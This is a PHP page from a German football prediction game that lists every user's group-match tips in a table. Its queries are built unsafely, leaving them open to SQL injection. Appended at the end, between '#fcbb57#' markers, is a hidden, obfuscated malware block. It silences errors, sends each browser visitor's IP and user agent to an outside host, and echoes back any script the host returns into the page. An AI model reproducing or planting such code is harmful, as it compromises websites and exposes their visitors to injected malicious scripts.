<?php
session_start();
$userId=$_GET["userId"];
if(strlen($userId)==0)
{
	header("Location: ../util/login.php5");
	exit;
}
echo "<html>";
echo "<head>";
echo "<link rel='stylesheet' type='text/css' href='../../style/style.css' />";
echo "<br>";
echo "<a href='../util/login.php5'>zurück</a>";
echo "<br>";
echo "<br>";
echo "<title>Werke's Tippspiel - Tipps ALL USERS (Germany)</title>";
echo "</head>";
echo "<body>";
include_once("../../connection/dbaccess-local.php5");
include_once("../../general/log/log.php5");
include_once("../util/calc.php5");
include_once("../util/dbutil.php5");
include_once("../util/dbschema.php5");

$log=new viewlogger();
$log->info("clicked showAllUsersTipps.php5");


printGroupMatches();


function getUserInfo($username){
	$tableusers=dbschema::users;
	$sql="SELECT * from $tableusers WHERE username='$username'";
	$resultUser=mysql_query($sql);
	$array=mysql_fetch_array($resultUser);
	$firstname=$array["firstname"];
	$lastname=$array["lastname"];
	return "$firstname $lastname";
}

function printGroupMatches(){
	
	echo "<h3>Gruppenspiele</h3>";
	echo "<br>";
	$table_matches=dbschema::matches;
	$sql="SELECT * FROM $table_matches m WHERE m.matchtype='Gruppenspiel'";
	$sqlResult=mysql_query($sql);
	
	echo "<table border='1' rules='all'>";
	echo "<tr>";
	echo "<th>Spiel</th> ";
	while($array=mysql_fetch_array($sqlResult)){
		
		$matchnr = $array["matchnr"];
		//echo "<td></td><td> $matchnr </td><td></td>";
		echo "<th align='center'> $matchnr </th>";
	}
	echo "</tr>";
	echo "<tr>";
	echo "<th>  Paarung </th>";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		$teamName1=$array["team1"];
		$teamName2=$array["team2"];
		//echo "<td align='right'>$teamName1</td> <td align='center'>-</td> <td align='left'>$teamName2</td>";
		echo "<td align='center'>$teamName1-$teamName2</td>";
	}
	echo "</tr>";
	
	$table_users=dbschema::users;
	$sql="SELECT * FROM $table_users t ORDER BY lastname,firstname";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		echo "<tr>";
		printGroupMatchesForUser($array["username"]);
		echo "</tr>";
	}
	echo "</table>";
}
function printGroupMatchesForUser($username){
	
	$table_matches=dbschema::matches;
	$table_users=dbschema::users;
	$table_tipps=dbschema::groupmatchtipps;
	echo "<tr>";
	echo "<td>" . getUserInfo($username) . "</td>";
	$sql="SELECT * FROM $table_matches m LEFT JOIN $table_tipps gmt ON m.matchnr=gmt.matchnr AND gmt.user='$username' WHERE m.matchtype='Gruppenspiel' ";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		$matchnr=$array["matchnr"];
		$tippGoalsTeam1=$array["goalsX"];
		$tippGoalsTeam2=$array["goalsY"];
		$evaluationDone=$array["evaluationDone"];
		if($evaluationDone === "T"){
			// get points
			$points = $array["score"];
			if($points == NULL){ // should not happen when evaluation is already done, but use default then
				echo "<td align='center'>$tippGoalsTeam1 : $tippGoalsTeam2</td>";
			} else if($points == 0){ // print white
				echo "<td><div align='center' style=\"background-color:white\">$tippGoalsTeam1 : $tippGoalsTeam2</div></td>";
			} else if($points == 2){ // print light blue
				echo "<td><div align='center' style=\"background-color:CCFFFF\">$tippGoalsTeam1 : $tippGoalsTeam2</div></td>";
			} else if($points == 4){ // print light green
				echo "<td><div align='center' style=\"background-color:CCFF99\">$tippGoalsTeam1 : $tippGoalsTeam2</div></td>";
			}
		} else {
			//echo "<td align='right'>$tippGoalsTeam1</td><td align='center'> : </td><td align='left'>$tippGoalsTeam2</td>";
			echo "<td align='center'>$tippGoalsTeam1 : $tippGoalsTeam2</td>";
		}
	}
	echo "</tr>";
}
?>
<?php
#fcbb57#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/fcbb57#
?>
